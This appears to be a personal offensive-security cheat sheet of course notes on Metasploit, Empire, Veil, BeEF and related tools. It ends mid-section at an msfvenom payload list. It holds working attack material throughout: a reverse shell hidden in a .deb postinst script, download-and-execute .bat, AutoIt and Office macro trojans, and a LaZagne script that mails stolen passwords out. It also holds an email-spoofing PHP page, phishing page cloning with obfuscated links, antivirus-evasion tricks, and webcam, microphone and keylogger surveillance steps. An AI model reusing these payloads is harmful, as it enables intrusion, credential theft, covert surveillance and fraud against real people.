<p align="center">
  <img src="https://user-images.githubusercontent.com/87951795/126915552-127cb983-1670-4561-957f-65f449103882.gif" alt="animated" />
</p>

## Virtual Machines
- https://www.kali.org/get-kali/
  - https://www.kali.org/docs/virtualization/
```
Change password
reboot
in boot screen pres e
edit line Linux
ro = rw
quite splash = init=/bin/bash
passwd root
exec /sbin/init
```
- https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/ ( Password: Passw0rd! )
- https://docs.rapid7.com/metasploit/setting-up-a-vulnerable-target
  - https://docs.rapid7.com/metasploit/setting-up-a-vulnerable-target
  - Metasploitable2 (Linux): https://sourceforge.net/projects/metasploitable/ ( msfadmin:msfadmin )
- https://zsecurity.org/download-custom-kali/

## Attacks Outside The Local Network. Expose Local Services To The Internet
1. Port Forwarding trought the router
	- Open router and set Port Forwarding or DMZ to Kali machine
	- set the multihandler to the local ip and the forwardet port
	- run route -n to see the router ip
2. Installing Kali/tools on the cloud
3. Port forwarding using SSH
	- https://www.youtube.com/watch?v=111ZDMKVTL4
4. Tunneling services

## Upgrading Basic Shell Access To A Meterpreter/Empire Access
usful linux comands
```
uname -a
whoami
ifconfig
```
use a wget linux or curl mac to download the shell to the /tmp/ directory  
run it using  
```
bash basic_bash_shell
```

## Metasploit - Basic Commands
- msfupdate :  It is used to update Metasploit with the latest vulnerability exploits.
- search [Keyword] or search name:Microsoft type:exploit
- show options
- show payloads
- msfdb init
- db_status
- info
- set or setg
- get : get variable value
- unset : deleat variable value
- spool : seve console autput to file
- save : save configs to use them later
- db-nmap : use nmap inside metasploit and fill values automaticli
  - hosts : show hosts
  - vulns : show exploitable vuls
  - sevices : show all discovered services on host
- run -j : run exploit in the back
- exploit 
- jobs : all runin jobs
- sessions : all open sessions
- sessions -l: all open sessions
- sessions -i [N] : interact to session number 
-  cntrl + z : background session

meterpreter
- sysinfo
- ipconfig: how you all the interfaces that are connected to the target computer.
- ps: ist all the processes that are running on the target computer.
- migrate [PID]  
	- migrate to a process that is less likely to be closed or terminated
		- explorer.exe that's the graphical interface of windows.
		- or migrate to spoolsv.exe recomendet in tryhackme
		- Now if we go on network,
and go into TCP connections,
you'll see that the connection here on port 8080,
is coming from explorer.exe,
so it's not coming from a malicious file,
our payload or backdoor is actually running
through the explorer.
now if you see firefox or chrome,
you can migrate to that process,
and especially that you're connecting
through port 8080, or you can use 80,
then it's gonna look even less suspicious
because 80 and 8080 are the ports used by web servers,
so it's very natural or very normal
to have a connection on port 80 or 8080.  
![Screenshot 2021-09-06 at 10 10 12](https://user-images.githubusercontent.com/87951795/132183266-8e52a127-d586-49b7-a7cd-f134cd370417.png)
- pwd, ls, cd, cat
- download [file name]
- upload [file name]
- execute -f [file.exe]
- shell: Get a Windows prompt or Windows command line
- background

- Log any mouse or keyboard event
	- keyscan_start
	- keyscan_dump
	- keyscan_stop
	- obviously you can use other
keylogger programs, like a portable keylogger.
And all you have to do is just upload it
using the upload command that we
learned before and execute it.
- Get a screenshot
	- screenshot
- Webcam and Mic
	- webcam_list 
	- webcam_snap 
		- -h : to display the help banner.
		- -i : The index number of the webcam to use.
		- -p : The JPEG image file path. By default $HOME/[randomname].jpeg
		- -q : The JPEG image quality, by default ’50’.
		- -v : Automatically view the JPEG image, by default ‘true’.
	- webcam_stream 
	- record_mic -h
	- run webcam -h

Meterpreter Android:
- use help and look at Stdapi: Webcam Commands and Android Commands
- webcam
	- webcam list
	- webcam_stream 2
- record_mic
	- record_mic -h
- geolocate
- send_sms -h
- dump_contacts
- dump_sms

## Maintaining Access (Post Explotation):
- Using a veil-evasion
	- Rev_http_service
	- Rev_tcp_service
	- Use it instead of a normal backdoor.
	- Or upload and execute from meterpreter
	- Does not always work
- Meterpreter: This metod is detectable by antivirus
	- run persistence  -U -i 20 -p [port] -r [ip]
		- run persistence -h
- Using metasploit + veil-evasion → More robust + undetectable by Antivirus		 
	- use exploit/windows/local/persistence
	- show options
		- set EXE_NAME browser.exe
		- set SESSION 1: You need to specify which session to run this exploit on. Where is your Meterpreter runing.
	- show advanced
		- set EXE::Custom /path/to/veil/backdor
	- exploit

- Maintaining Access On OS X (dont need root you can do it running as the normal user)
background the open session  
```
background
```
use a osx exploit
```
use exploit/osx/local/persistence
show options
set RUN_NOW true
sessions -l
set SESSION Nº
show payloads
set PAYLOAD osx/x86/shell_reverse_tcp
set LHOST 10.10.10.10
set LPORT 2222
exploit
```
save to a notepad the comand to remove the servis from targer mac

run the multihandler to resive the conection
```
use exploit/multi/handler 
set PAYLOAD osx/x86/shell_reverse_tcp
set LHOST 10.10.10.10
set LPORT 2222
exploit
```

## Pivoting (Post Explotation):
1. (Option) All we need to do is we can upload any tool we need to use,
for example, if you wanted to use Nmap
or ARP spoof or dSniff,
you can upload any of these tools,
run them on this computer,
which is connected to this big network,
but it's not always a good idea to upload things
to a hacked computer.
2. (Option) setting up a Route
	- Run ifconfig first
to see what the target network looks like.
So we can see all the interfaces connected
to the target computer.
And I'm gonna look for interfaces with IP addresses.
Example 10.10.10.0
	- use post/multi/manage/autoroute
		- set SESSION [N of runing session]
		- set SUBNET 10.10.10.0
		- exploit
	- Now I did set up a route between this network and my Kali computer
	- You can use exploits as normal but pointing to this IP


## Beef
To Hook:
- DNS spoof request to a page containing the hook
- Inject the hook in browsed pages (need MITM)
- Use XSS exploit
- Social enfineer the target to open a hook page
```
git clone https://github.com/beefproject/beef.git
./install
nano config.yaml
change user and password
<script src"http:/ip:port/hook.js"></script>
```
JS to inject
```
var imported = document.createElement('script');
imported.src = 'http://YourIP:3000/hook.js';
document.head.appendChild(imported);
```
Add to hstshijack.cap in payloads ,*:path/beef.js
- Commands
	- Spyder Eye (Take screnshot)
	- Redirect Browser
	- Pretty Theft
	- Fake Notification Bar

## Creating A Replica Of Any Website / Login Page
- https://addons.mozilla.org/en-GB/firefox/addon/webscrapbook/
- Capture tab (source)
```
sudo setoolkit
1) Social-Engineering Attacks
2) Website Atack Vectors
3) Credential Harvester Attack Method
3) Custom Import
Put All Data
2) Copy the entire folder
Url of the original web
```
Go to a URL shorter like https://bit.do/ or https://tinyurl.com/app/ to modificate the raw IP
add the <a></a> to the email
```
<a href="http://bit.do/amazon.com">amazon.com</a>
```
- URL Manipulation
```
https://support.mozilla.org-blog@tinyurl.com/mejordeporte
```
- use https://splitline.github.io/domain-obfuscator/
```
https://support.mozilla.org-blog@ⓣ㏌ʸⓤℛˡ.Ⅽⓞᴹ／ₘⅇⱼₒᵣⓓⓔＰℴℜᵗＥ
```

## Google Analytics Social Engineering 
So like I said Google Analytics is used to track the people that visit the website or the YouTube channel
and know what they're interested in so what this payload is gonna do it's going to generate a lot of traffic
that's going to visit this page, which is managed by your target
and it's gonna show that the traffic is coming from 10.20.14.213,
so it's coming from the link that you want your target to go to.
Now once the target sees that they're getting a lot of traffic from a certain website.
They'll be tempted to go to that website and once they click on it you'll gain access to them

```
sudo setoolkit
11) Third Party Modules
2) Goolge analytics attack
manual
UA-XXXXXX
Fill data
```
Now in a real life scenario you can upload the BeEF page to a free hosting and then use a domain name,
so that in the source you'll actually see a nice normal domain like zaid.com, for example

## Fake Emails
1. Use some email spoof service but they end up in spam
	- Google spoof email
2. Use your own server (hosting like https://www.dreamhost.com/)
Create send.php in the the website directory and go to the /send.php
```
<?php

if (isset($_POST["send"])) {

	$to = $_POST["to"];
	$subject = $_POST["subject"];
	$message = $_POST["message"];
	$from = $_POST["from"];
	$name = $_POST["name"];

	if (!(filter_var($to, FILTER_VALIDATE_EMAIL) && filter_var($from, FILTER_VALIDATE_EMAIL))) {
		echo "Email address inputs invalid";
		 die();
	} 

	$header = "From: " .  $name . " <" . $from . ">\r\nMIME-Version: 1.0\r\nContent-type: text/html\r\n";

	$retval = mail ($to, $subject, $message, $header);

	if ($retval) {
		echo "Email sent.";
	} else {
		echo "Email did not send. Error: " . $retval;
	}
} else {
	echo 
	'<html>
		<head>
			<style> 
				input[type=submit] {
				  background-color: #4CAF50;
				  border: none;
				  color: white;
				  padding: 14px 32px;
				  text-decoration: none;
				  margin: 4px 2px;
				  cursor: pointer;
				  font-size: 16px;
				}
			</style>
		</head>
		<body>

			<h2>Spoof Email</h2>

			<form action="/send.php" method="post" id="emailform">
			  <label for="to">To:</label><br>
			  <input type="text" id="to" name="to"><br><br>
			  <label for="from">From:</label><br>
			  <input type="text" id="from" name="from"><br><br>
			  <label for="name">Name (optional):</label><br>
			  <input type="text" id="name" name="name"><br><br>
			  <label for="subject">Subject:</label><br>
			  <input type="text" id="subject" name="subject"><br><br>
			  <label for="message">Message [HTML is supported]:</label><br>
			  <textarea rows="6" cols="50" name="message" form="emailform"></textarea><br><br>
			  <input type="hidden" id="send" name="send" value="true">
			  <input type="submit" value="Submit">
			</form> 

			<p>An e-mail will be sent to the desired target with a spoofed From header when you click Submit.</p>

		</body>
	</html>' ;
}


?>
```

3. Sing up for SMTP or email server 
	-  https://www.sendinblue.com/
```
sendemail --help
sendemail -xu [email] -xp [password] -s [server:port] -f "admin@google.com" -t "target@email.com" -u "Titel of the email" -m "Mesage Body dropboxlink-dl=1 " -o message-header="From: Sundar Pichai <admin@google.com>"
```
message-header it will show the name not the email in the delivery box

## Linux Malware
- In Empire we have the multi backdors that will work in Linux, Mac and Android
```
usestager multi/bash
info
set Listener NAME
set OutFile /path/name
execute
```
to run it as a test
```
bash test_bash_shell
```
interact 
```
interact [agent name]
```
- ZLooger for Linux
```
python zlogger.py -i 60 -l -e [email] -p [password] -o [Name]
ls dist/
```
to run it
```
chmod +x linux-keyloger
./linux-keyloger
```
remove the keyloger from the machine
```
cd .config
cd autostart
ls
xinput.desktop
```
Now this is what's making the program start with the startup.
```
rm xinput.desktop
```
- LaZagne run on Linux
https://github.com/AlessandroZ/LaZagne  
Compilet or download de stand alone for linux  
```
chmod +x LaZange
./LaZange --help
./LaZange all
```
- ZReporter
https://github.com/z00z/ZReporter  
The idea of the script is, it will allow you to run any UNIX based command on the target computer.
It will execute that command and send you the result by email.  
So using the script we'll be able to download LaZange,
execute it and then get the results on our email.
```
edit this and enable less secure application on the email
COMMAND = "cd /tmp/ && wget -q [URL] && chmod +x LaZange && ./LaZange all" 
EMAIL = "name@gmail.com"
PASSWORD = "password"
```
you can see that your username and password can be read in plain text in this script.
So what we wanna do is we want to compile this file to an executable.
To do that we're gonna use the tool called PI installer
```
pip install pyinstaller
pyinstaller --onefile ZReporter.py
```
on targer linux pc
```
chmod +x ZReporter
./ZReporter
```
- Embedding Evil Code In A Legitimate Linux Package
Download a .deb file  
https://packages.ubuntu.com/  
extract Files  
```
dpkg -x file.deb dir_to_extract_data
```
extract Control Paquets
```
ar -x file.deb 
```
open the control file it generates a control directory  
We need the control file and postinst file if we dont have the postinst we can create it later  
------  
go to dir_to_extract_data  
create New dir call DEBIAN  
paste the control and postinst file  
we put the evil code in postinst file 
```
#!/bin/bash

sudo bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
```
save the postinst file and make it executable
```
chmod 755 postinst
```
generate the .deb file
```
dpkg-deb --build dir_to_extract_data
```

## Backdooring a Legitimate Android App
Download a .apk
Configur Kali to use Java 8
```
update-alternatives --config java
```
Select the java 8
Generate the backdoor using FatRat
```
5) Backdooring Original apk
fill options and put the path to the .apk file
```

## Mac OSX Malware
Fat Rat and Empire can both generate OSX payloads.
- Select OS X option in from menu 01 in Fat Rat.
- Or use a stager that starts with osx in Empire.
1. Option EMPIRE
- Create an listener
```
uselistener http
info
set Port 8080
execute
back
list
```
- Create backdoor applescript
```
usestager osx/applescript
set Listener NAME
set OutFile /path
execute
```
- Interact whit the conection
```
interact [agent name]
```
Converting Basic Script Backdoor To An Executable  
Go to mac and open Script Editor copy past the script and select the file format of Application  

Embedding A Normal File With Backdoor  
- Create a comand to download and open a real file in tmp directory
```
cd /tmp/
curl [URL] -O -s
open pdf.pdf
or
cd /tmp/ &&  curl [URL] -O -s && open pdf.pdf
```
- Take the Empire script and copy it to the mac Script Editor and add the comand in [+] and separate it usin ; for the reverse shell
```
do shell script "[+] ; echo...."
```
- to test it click the play button
- select the file format of Application  

2. Option Msfvenom and download and execute metod
- Use msfvenom to generate a backdor
```
msfvenom --list payloads
msfvenom --payload python/meterpreter/reverse_tcp --payload-options
msfvenom --payload python/meterpreter/reverse_tcp  LPORT=XXXX  LHOST=XXXXXXXX > rev_tcp_4444.py
```
- Create a shell script to download and open a real file and backdoor in tmp directory
```
do shell script "cd /tmp/ &&  curl [URL PDF] -O -s && open pdf.pdf; curl [URL to .py backdoor] -O -s && python backdoor.py"
```

Changing Trojan's Icon  
With Mac OS, you can see that with PDF files
it actually shows a preview of the content of the file.
So, it doesn't use one icon, the icon will actually change depending on the PDF file.
I zoomed in, in to the File Manager,
I took a screenshot, I opened it with Gimp
and then I cropped the screen to the icon, that the default file would have.

if you are sending a file as an image,
then the job is easy, you can just use this online service to convert your image to an icon

but if you're mimicking something simple like a video or an image or an mp3 file,
then you can just use or even a word document, then you can just use the generic icon for that file type.

Now, once you have the image that you want to use and I have this one that I created like I said before,
you, you need to convert this image to a '.icns' extension
because that's the extension that Mac uses for its icons

Go to script editor > new from templetes > Cocoa -AppleScript Applet
- copy past all you script
- click the [ |] icon on top
- copi the name of the default icns the applet.icns
- delet the dafaul .icns and drag the one we made rename it to the applet.icns
- go to File > Export > uncheck the show startup screan > Format aplication


Configuring The Trojan To Run Silently  

The only problem right now is if you look at the status bar,
you'll see when we executed the backdoor it created two processes.
So it created a process here, which is called the research
and that's actually the process for the backdoor itself.
So this is the process that connected to my computer and it's allowing me to hack that computer
and at the same time we see a preview here and this is the PDF that the backdoor downloaded.

rigt click the backdoor > Show Package Content > go Contents > Open info.plist > open in text editor  
add this key entry after de dict and befor the first kay  
```
<key>NSUIElement</key>
<string>1</string>
```

Embedding Backdoor In A Legitimate Microsoft Office Document
- Create backdoor macro in empire
```
usestager osx/macro
set Listener NAME
set OutFile /path
execute
```
copy the backdoor macro and past it in for example exel View > Viev Macros
- Set macro name to 
```
Auto_Open
```
- Select the curent workbook in Macros in:
- click on plus
- select all delet it and paste the macro
- Change the name inside the macro
```
Private Sub Auto_Open()
```
- Seve the file like Exel 97-2004 .xls

## Veil
Kali 2020
```
apt update
apt install -y mitmproxy
apt install -y veil
/usr/share/veil/config/setup.sh --force --silent
apt install -y gnome-shell-extension-dashtodock
sed -i.bak 's/# disable-user-list=true/disable-user-list=true/g' /etc/gdm3/greeter.dconf-defaults
```
Kali 2021
```
apt update
apt install -y veil
/usr/share/veil/config/setup.sh --force --silent
```
Generating An Undetectable Backdoor  
```
veil
use
1) Evasion =  generates undetectable backdoors for us.
2) Ordnance = generates the payloads that's used by evasion.
use 1
list
use 15
set LHOST 10.10.10.10
set LPORT 8080
```
Now, if you generate the backdoor like this,
you will bypass all antivirus programs except AVG.
I'm gonna set some optional options
that really won't do much of a difference.
They'll just make the backdoor look a bit different.
```
set PROCESSORS 1
set SLEEP 6
generate
```
Let's go ahead and check to see if the backdoor is detected
by any antivirus programs.  
You can also use VirusTotal,
but I don't recommend that and please don't do that,
because if you do that,
your backdoor will become less effective.
Because VirusTotal share the results of their scans
with antivirus programs.  
use: https://nodistribute.com/  
or: https://antiscan.me/  
it's similar to VirusTotal.
The only difference
is it's not gonna share the scan results
with antivirus programs, so it won't affect your backdoor.

Antivirus programs always update their database
and Veil also always updates
the way they generate backdoors.
So first of all, you want to make sure that you're using
the latest version of Veil
and you'll have to experiment with the different payloads
and different options until you get it to work.  

Undetectable Backdoors Advance: https://www.youtube.com/watch?v=cgM-_42rWbM  
Bypassing Anti-Virtus & Hacking Windows 10 Using Empire: https://zsecurity.org/bypassing-anti-virtus-hacking-windows-10-using-empire/

Listening For Incoming Connections
```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 10.10.10.10
set LPORT 8080
save
exploit
```
## TheFatRat
- https://github.com/Screetsec/TheFatRat
```
git clone https://github.com/Screetsec/TheFatRat.git
cd TheFatRat
chmod +x setup.sh && ./setup.sh
```
Update
```
cd TheFatRat
./update && chmod +x setup.sh && ./setup.sh
```
Create Backdoor using PwnWinds  
backdoor generated with this uses PowerShell. Powershell comes in pre-installed with all Windows machines after Windows 7.
So you can guarantee that it's going to work on all Windows computers,
if they're running Windows 7 and up.  
```
fatrat
6
try diferents like 1
```
## Empire (Don't use Metasploit)
- https://github.com/BC-SECURITY/Empire
- GUI https://github.com/BC-SECURITY/Starkiller
	- windows, mac, linux, android 
	- use encription for the shell
Generate Listener
```
sudo apt install powershell-empire
- Terminal 1
powershell-empire server
- Terminal 2
powershell-empire client
help
uselisteners http
set Port 8080 
options
execute
terminal 1 > show 1 listener
back
```
Generate Backdor
```
- Terminal 2
usestager widows/launcher_bat
set Listener http
set OutFile http8080.bat
execute
```
When we get a shell
```
- Terminal 1
agents
interact xxxxx
```

Post Explotation using empire:
```
info
help
shell 
*or
shell sysinfo
shell ipconfig
download file.txt
upload /path/file.exe
shell ./file.exe
```
go to var/lib/powershell-empire/downloads and the session name to see the download  

Modules:  
```
usemodules (clik TAB * 2) to see list
ps (to see all proceses)
usemodules managment/psinject
- info
- set ProcId (nº proces to migrate)
- set Listener (name)
- execute
```
2 Methods to Escalating Privileges On OS X
```
usemodules collection/osx/prompt
- execute
- back
usemodules privesc/multi/sudo_spawn
- set Listener (name)
- set Password (password)
- execute
```
change to new agent and run sysinfo or whoami to check if it work  

Maintaining Access On OS X
```
usemodules persistence/osx/launchdaemonexecutable
- info
- set DeamonLocation /Library/Application Support/QuicktimeDaemon
- set Listener (Name)
- set DeamonName com.apple.QuickTime
- info 
- execute
```
change to new agent

## Modifying Backdoor Source To Bypass All Anti-virus Programs
for the .bat backdors generated whit fatrat and empire (Dos and powershell code)  
Now we can't open the backdoor generated with VEIL use in a text editor because they'll generate EXE backdoors.  
And if we open them using a text editor, we'll just get gibberish.  
Idea:
- Open backdoor with text editor.
- Make sure shellcode is not detect, if it then change payload settings or use a different one.
- Remove all arguments, add them one by one to identify the one triggering AV programs
- Remove / modify detectable code.
```
powershell -w 1 -C "value.toString()'AKJHDSFIUOSAEIUHEUIFEIUOFDSOIUFSOIEOIFSOIUEFOIOEIOJEFJOOJIE'"
```
Remove all exept the shell code (this is the part of the code that will do the magic)
```
AKJHDSFIUOSAEIUHEUIFEIUOFDSOIUFSOIEOIFSOIUEFOIOEIOJEFJOOJIE
```
Upload this .bat to https://nodistribute.com/ to see if its geting detected
If the shellcode is getting detected, then you need to play around with the parameters, with the ports,
with the stager that you're using.
So until you reach a shell code that's not detected  
then start to play aroud and uploading it to nodistribute to se what is trigering the antivirus
```
toString()'AKJHDSFIUOSAEIUHEUIFEIUOFDSOIUFSOIEOIFSOIUEFOIOEIOJEFJOOJIE'"
```
```
-C "value.toString()'AKJHDSFIUOSAEIUHEUIFEIUOFDSOIUFSOIEOIFSOIUEFOIOEIOJEFJOOJIE'"
```
```
powershell -w 1 -C "value.toString()'AKJHDSFIUOSAEIUHEUIFEIUOFDSOIUFSOIEOIFSOIUEFOIOEIOJEFJOOJIE'"
```
So literally, if you actually upload this code right here to not distribute, it's going to bypass
everything.
And if you add the forward slash B to it, it's going to get detected by two antivirus programs like
we've seen before.
```
powershell -w /b 1 -C "value.toString()'AKJHDSFIUOSAEIUHEUIFEIUOFDSOIUFSOIEOIFSOIUEFOIOEIOJEFJOOJIE'"
```
So you can literally just remove this B or add another argument  like /min here and what this is going to do,
it's going to change the source code of the file.
It's going to change the signature of the file, and it's actually going to bypass all antivirus programs
by literally just adding one argument that doesn't really affect the whole code.
```
powershell -w /min /b 1 -C "value.toString()'AKJHDSFIUOSAEIUHEUIFEIUOFDSOIUFSOIEOIFSOIUEFOIOEIOJEFJOOJIE'"
```

## Bypassing All Anti-Virus Programs By Modifying Hex Vales (metod for .exe files)
- Hex Editor
	- https://mh-nexus.de/en/programs.php
- Open the hex editor and look for strings and modifai them
- But you wanna make sure you don't put more or less characters, you wanna put exactly the same amount of characters.
- You don't even need to put spaces, you can just put characters
- Idea: Use the yara rule that create the strings to identifi malware and modifi that strings

## Generic executable that downloads & executes files
- Ideas:
	- Download backdoor + keylogger.
	- Download keylogger + password recovery tool.
	- Download keylogger + password recover tool + backdoor.
	- Use it as  a trojan --  evil file + a normal file.
Create this .bat file add the direct links to downloads. It will download and execute all you put in the links when targer opens the .bat file
```
@echo off

set files='url1','url2'

powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
```
* to avoid popups make an incisible of execution exe form the backdor and then from this bat script you can add an icon and spoof the extention look at [Running Evil Files Silently In The Background like Veil exe files (Convert Bat to Exe)]

## Running Evil Files Silently In The Background like Veil exe files (Convert Bat to Exe)
- https://github.com/tokyoneon/B2E/blob/master/Bat_To_Exe_Converter.zip
	- Open the bat file
	- Select Exe invisible format
	- can add recuest admin privilegs when run
	- convert > convert 
	- select the icon option
		- https://iconarchive.com/ (select the rigth size) (dont download the ico its low resolution download the png and use a converter)
			- https://cloudconvert.com/png-to-ico
			- https://hnet.com/png-to-ico/
			
## Spoofing File Extension from .exe to anything else (pdf, png ..etc)
add rigt-to-left character
go to an app characters and search left-to-rigth
```
fdp.exe
to
exe.pdf
```
send it in zip or firefox will remove the right-to-left character

## Backdooring Any File (Method 2)
Download and execute anything and any number of files.  
AutoIt Scripting: (AutoIt is not installed in kali but it install automaticli when install veil)  
```
#include <StaticConstants.au3>
#include <WindowsConstants.au3>

Local $urls = "url1,url2,url3..."

Local $urlsArray = StringSplit($urls, ",", 2 )

For $url In $urlsArray
	$sFile = _DownloadFile($url)
	shellExecute($sFile)

Next

Func _DownloadFile($sURL)
    Local $hDownload, $sFile
    $sFile = StringRegExpReplace($sURL, "^.*/", "")
    $sDirectory = @TempDir & $sFile
    $hDownload = InetGet($sURL, $sDirectory, 17, 1)
    InetClose($hDownload)
    Return $sDirectory
EndFunc   ;==>_GetURLImage
```
save whit .au3 extention
use autoit compiler to convert to EXE
select an icon form iconarchive.com or serch img to icon on google exampl http://rw-designer.com/image-to-icon
spoof the name add right-to-left character

## Trojan Factory
- https://github.com/z00z/TrojanFactory
Installation:
    - Download AutoIt (https://www.autoitscript.com/site/autoit/downloads/).
    - Install it using wine > wine autoit-v3-setup.exe
    - Clone Trojan Factory: > git clone https://github.com/z00z/TrojanFactory.git
    - You're all set, navigare into TrojanFactory > cd TrojanFactory
    - Run --help for usage > python trojan_factory.py --help
```
python trojan_factory.py -f (Front file url) -e (evil file url) -o (export path) -i (icon)
```

## Trojans in Microsoft Office Docs
- Microsoft Office documents can run VBA code.
- VBA can be used to download & execute files.
- Create a normal document with VBA code to download & execute evil files.
Now Empire made this really easy for us as it can generate macros,
which are basically made of the code that we can embed inside Microsoft Office documents.
```
Run Empire
usestager windows/macro
info
set Listener to (http or the one you created)
set OutFile /http/server
execute
```
Open Microsoft Office word,exel,powerpoint  
View > Macros > Macros in document1 > create  
copy past all code from macro created in empire  
save as word 97-2003
the target needs to enamble the content for the macro to work

2 option. If don want to use empire macros add this download script whit the link to the troja to the macro document
```
Sub AutoOpen()
    Dim cc As String
    cc = "pow"
    cc = cc + "ers"
    cc = cc + "hell "
    cc = cc + "-NoP -NonI -W Hidden """
    
    cc = cc + "('url1','url2')"
    
    cc = cc + "|foreach{$fileName=$env:temp+'\'+(Split-Path -Path $_ -Leaf);"
    
    cc = cc + "(new-object System.Net.WebClient).DownloadFile($_,$fileName);"
    
    cc = cc + "Invoke-Item $fileName;}"
    
    cc = cc + """"

    VBA.CreateObject("WScript.Shell").Run cc, 0

End Sub
```

## ZLogger (keyloger)
the keyloggers that come with 'Empire' and with 'Meterpreter' store the data on file,
they store the data on the computer.
Also, for you to be able to read this data,
you'll need to come back after a while and connect to this computer through your back door
and then read the data that these keyloggers have gathered.

Whereas when it comes to the keylogger that we're gonna have a look on now,
it'll actually run in the background and send the data to you through your email.
- https://github.com/z00z/ZLogger
```
git clone https://github.com/z00z/ZLogger
cd ZLogger
bash install.sh
python zlogger.py --help
python zlogger.py -i 60 -w -e email@gmail.com -p PASSWORD123 -o filename
* on the email enable less secure app access
```
The generated file is in opt/ZLogger/dist

Bee Logger
- https://github.com/4w4k3/BeeLogger

## LaZagne (retrieve lots of passwords stored on a local computer)
- https://github.com/AlessandroZ/LaZagne
1. Option direct download
- https://github.com/AlessandroZ/LaZagne/releases/
```
laZagne.exe all 
laZagne.exe all -oN filename
``````
2. Send it and resive results in Mail
Dowload the compiled reles and open a server so it can be open directly add permitions to avoid error
```
chmod 777 laZagne.exe
```
Add the link, email and password * on the email enable less secure app access  
create this .bat file  
```
@echo off

set downloadURL=http://10.20.14.213/evil-files/laZagne.exe
set email=email@gmail.com
set password=PASSWORD

set exeFile=%TEMP%\proc.exe
set logFile=%TEMP%\proclog.txt
set arguments=all


powershell (new-object System.Net.WebClient).DownloadFile('%downloadURL%','%exeFile%');
%exeFile% %arguments% > %logFile%

del %exeFile%

powershell $SMTPServer = 'smtp.gmail.com';$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPInfo.EnableSsl = $true;$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('%email%', '%password%');$ReportEmail = New-Object System.Net.Mail.MailMessage;$ReportEmail.From = '%email%';$ReportEmail.To.Add('%email%');$ReportEmail.Subject = 'Lazagne Report';$ReportEmail.Body = 'Lazagne report in the attachments.';$ReportEmail.Attachments.Add('%logFile%');$SMTPInfo.Send($ReportEmail);

del %logFile%
```

3. Is includet in Pupy Rat
- https://github.com/n1nj4sec/pupy

## Fake Update
If the updates are coming from
a https website, then we won't be able to hijack them
and make fake updates.

1. We need to do MITM
2. We need to serve fake update form evilgrade

We use bettercap to intercept conection and spoff dns of the update to evilgrade server.  
Evilgrade will give the exe like it is an update and the target will execut it.
We get a rever shell  

EvilGrade (run in port 80)
```
cd /opt/evilgrade 
./evilgrade
or 
sudo apt intall isr-evilgrade
```
To get a list of all the programsthat we can hijack their updates
```
show modules
configure dap
show options
```
he main option that we wanna change
is the Agent.
This is the path to the program
that will be installed as an update.
Replacing this with the backdoor
```
set agent /path/to/exe
```
The next thing that I wanna modify is the Endsite
You don't have to change it with every module.
```
set endsite www.speedbit.com
start
```
So right now, if Evil Grade gets a request for an update,
it will say, "Yes, there is an update,"
and it will serve the backdoor.exe as the update.

Bettercap
```
bettercap -iface eth0 -caplet /.cap
```
We also need to use Bettercap to run a DNS spoofing attack
and spoof any request to update.speedbit.com  
This is the domain that the target program usesto check for updates
```
set dns.spoof.all true
set dns.spoof.domains update.speedbit.com
dns.spoof on
```
start the listener

## Backdooring Downloads on The Fly (works on http)
Tool: Backdoor Factory Proxy  
```
cd /opt/BDFProxy
nano bdfproxy.cfg
proxyMode = transparent
search for Windowsx86 - x64 or Linuxx86 - x64 depent of target change HOST to your ip
./bdf_porxy.py
```
So this program right now is running on its own,
and as soon as it receives a request for an EXE,
it's going to backdoor that executable.
```
bettercap -iface eth0 -caplet /.cap
```
use iptables to redirect the data form bettercap to BDFProxy
```
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
```
So now we're using bettercap to intercept data.
All this data is gonna be redirected using this rule
to BDFProxy, which will wait and see
if there is an EXE being downloaded,
it'll backdoor it, and then serve it back to the target.
When the target executes the EXE, will execute a backdoor
that'll send the connection back to me.  
Start Listener Meterpreter or use the resource file from Backdoor Factory Proxy
this file right here will automatically start
the multi/handler and listen for incoming connections
for all of the payloads that we sow
in the configuration file of BDFProxy.
```
msfconsole --resource /opt/BDFProxy/bdfproxy_msf_resource.rc
```
test whit speedbit or any exe 

## Pentesting Resources
https://github.com/swisskyrepo/PayloadsAllTheThings  
https://pentestmonkey.net/  

## Reverse Shell
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md  
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet    

## Wordlists  
https://github.com/danielmiessler/SecLists   
https://wordlists.assetnote.io/   
https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm   

## PEASS-ng Privilege Escalation Scripts
https://github.com/carlospolop/PEASS-ng  

## Linux - Privilege Escalation
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
 
## Linux Tools- Privilege Escalation
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS  
https://github.com/rebootuser/LinEnum  
https://github.com/diego-treitos/linux-smart-enumeration  
https://github.com/TH3xACE/SUDO_KILLER  
https://github.com/AlessandroZ/BeRoot  
https://github.com/pentestmonkey/unix-privesc-check  
https://github.com/sleventyeleven/linuxprivchecker  

## Port Forwarding
In some instances, a root process may be bound to an internal port, through which it communicates.
If for some reason, an exploit cannot run locally on the target machine, the port can be forwarded using SSH to your local machine:
- R is a remote tunnel (Debian --> Kali)
```
ssh -R <local-port>:127.0.0.1:<target-port> <username>@<local-machine>
```
- L is a local tunnel (Kali --> Debian)
```
ssh -L 10000:localhost:10000 <username>@<ip>
```
The exploit code can now be run on your local machine at whichever port you chose.

## msfvenom
```
msfvenom -l payloads
msfvenom -l formats
```
Generate a payload
```
msfvenom -p <payload> LHOST=<attacker IP> LPORT=<attackerPORT> -f <format> -o <output payload file name>
```
This payload generates an encoded x86-64 reverse tcp meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly, and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
```
Comon payloads
- Meterpreter
```
